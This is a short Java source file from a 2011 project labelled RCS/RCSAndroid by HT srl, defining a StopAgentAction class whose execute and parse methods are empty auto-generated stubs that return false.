/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : StopAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
public class StopAgentAction extends SubAction {

	/**
	 * Instantiates a new stop agent action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public StopAgentAction(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(byte[] params) {
		// TODO Auto-generated method stub
		return false;
	}

}
